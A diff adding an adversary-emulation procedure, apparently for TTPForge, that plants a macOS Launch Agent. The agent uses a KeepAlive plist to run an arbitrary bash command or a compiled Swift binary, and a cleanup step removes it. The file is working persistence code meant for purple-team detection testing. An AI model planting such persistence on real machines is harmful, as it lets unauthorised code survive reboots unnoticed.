@@ -1,0 +1,67 @@
+---
+name: macOS Launch Agent persistence with Swift support
+description: |
+  This TTP creates a launch agent that executes a given shell command or a compiled Swift script for persistence.
+args:
+  - name: cleanup
+  - name: command_or_path
+  - name: use_swift
+    default: true
+mitre:
+  tactics:
+    - T0003 Persistence
+  techniques:
+    - T1543 Create or Modify System Process
+  subtechniques:
+    - T1543.001 Create or Modify System Process: Launch Agent
+steps:
+  - name: launchagent
+    inline: |
+      set -e
+
+      command_or_path="{{ .Args.command_or_path }}"
+      use_swift="{{ .Args.use_swift }}"
+
+      if [[ "$use_swift" == "true" ]]; then
+        echo -e "First building the source Swift into a compiled binary..."
+        swiftc launchagent.swift -o launchagent
+        echo "Executing the compiled launchagent binary. This will drop the plist file and immediately loading it with launchctl..."
+        ./launchagent
+      else
+        echo "===> Creating ~/Library/LaunchAgents if it does not already exist..."
+        mkdir -p "/Users/$(whoami)/Library/LaunchAgents"
+        echo "===> Writing plist to ~/Library/LaunchAgents/com.ttpforge.plist"
+
+        cat <<EOF > ~/Library/LaunchAgents/com.ttpforge.plist
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE plist PUBLIC "-//Apple/DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+        <plist version="1.0">
+        <dict>
+          <key>Label</key>
+          <string>com.ttpforge.plist</string>
+          <key>ProgramArguments</key>
+          <array>
+            <string>bash</string>
+            <string>-c</string>
+            <string>$command_or_path</string>
+          </array>
+          <key>KeepAlive</key>
+          <true/>
+        </dict>
+        </plist>
+        EOF
+
+        echo "===> Persistence done. ~/Library/LaunchAgents/com.ttpforge.plist dropped which executes $command_or_path. Persistence will be loaded on next reboot."
+      fi
+
+    cleanup:
+      inline: |
+        set -e
+
+        if [[ "{{ .Args.cleanup }}" == "true" ]]; then
+            launchctl unload -w ~/Library/LaunchAgents/com.ttpforge.plist
+            rm -f /Users/Shared/purple.sh
+            rm -f ~/Library/LaunchAgents/com.ttpforge.plist
+            rm -f launchagent
+            echo "Cleanup Finished!"
+        fi
